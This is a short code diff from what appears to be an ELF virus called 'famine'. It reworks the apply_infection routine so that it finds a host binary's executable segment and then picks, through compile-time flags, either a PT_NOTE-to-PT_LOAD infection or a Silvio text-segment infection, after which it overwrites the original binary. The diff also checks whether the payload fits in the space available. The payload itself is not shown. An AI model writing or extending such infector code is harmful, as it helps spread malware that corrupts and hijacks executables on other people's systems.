@@ -39,7 +39,7 @@ void apply_infection(t_famine *famine)
 
     for (size_t i = 0; i < famine->ehdr->e_phnum; i++)
     {
-        if (famine->phdr[i].p_type == PT_LOAD && famine->phdr[i].p_flags == (PF_R | PF_X))
+        if (is_text_segment(famine->phdr[i]))
         {
             //text found here, get the offset of the end of the section;
             famine->text_p_start_offset = famine->phdr[i].p_offset;
@@ -47,16 +47,19 @@ void apply_infection(t_famine *famine)
             famine->text_p_size = famine->phdr[i].p_filesz;
             famine->text_p_vaddr = famine->phdr[i].p_vaddr;
 
-            // // TODO remove line bellow
-            // pt_note_to_pt_load_infection(famine);
-            // overwrite_original_binary(famine);
-            // break;
-            // // END TODO
-
-            silvio_text_infection(famine);
-            overwrite_original_binary(famine);
-            break;
-
+            if (FORCE_PT_NOTE_TO_PT_LOAD_INFECTION)
+            {
+                pt_note_to_pt_load_infection(famine);
+                overwrite_original_binary(famine);
+                break;
+            }
+            else if (FORCE_SILVIO_TEXT_INFECTION)
+            {
+                if (DEBUG == true)
+                    printf("Applying silvio_text infection.\n");
+                silvio_text_infection(famine);
+                overwrite_original_binary(famine);
+            }
             // Check if there is enought space for our payload in the text section.
             if (famine->payload_size > PAGE_SIZE)
             {
@@ -73,6 +76,7 @@ void apply_infection(t_famine *famine)
             {
                 error(ERROR_NOT_ENOUGHT_SPACE_FOR_PAYLOAD, famine);
             }
+
             break;
         }
     }
